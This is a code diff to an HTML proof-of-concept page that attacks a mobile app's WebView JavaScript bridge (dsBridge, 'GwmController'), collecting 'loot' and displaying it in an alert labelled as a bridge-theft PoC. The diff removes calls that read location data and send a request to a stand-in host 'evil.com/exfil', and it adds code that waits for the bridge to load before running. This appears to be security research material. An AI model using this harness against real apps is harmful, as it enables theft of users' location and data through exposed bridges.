@@ -120,6 +120,11 @@ function lockNS(){
   return 'GwmController';
 }
 
+function nsReady(){
+  try { return !!(window._dsbridge && typeof window._dsbridge.call === 'function'); }
+  catch(e){ return false; }
+}
+
 function run(){
   LOG.textContent = '[验证中...]';
   loot = [];
@@ -177,29 +182,6 @@ function run(){
   } catch(e){}
 
   flush();
-
-  try {
-    dsBridge.call(NS + '.locationInfo', {}, function(r, done){
-      loot.push('[locationInfo] ' + JSON.stringify(r));
-      if (done) flush();
-    });
-  } catch(e){ loot.push('[locationInfo] 异常: ' + e); }
-
-  try {
-    dsBridge.call(NS + '.requestData', {
-      method: 'get',
-      hostType: 'ntsp',
-      host: 'https://evil.com/exfil',
-      url: '/grab',
-      params: {},
-      customHeader: { 'X-PoC': '1' }
-    }, function(r, done){
-      loot.push('[requestData] ' + JSON.stringify(r));
-      if (done) flush();
-    });
-  } catch(e){ loot.push('[requestData] 异常: ' + e); }
-
-  setTimeout(flush, 3000);
 }
 
 function flush(){
@@ -208,7 +190,15 @@ function flush(){
   alert('【GWM Fusion JS Bridge 窃取 PoC】\n' + text);
 }
 
-run();
+function start(){
+  if (nsReady()) { run(); return; }
+  setTimeout(start, 200);
+}
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
+  start();
+} else {
+  document.addEventListener('DOMContentLoaded', start);
+}
 </script>
 </body>
 </html>
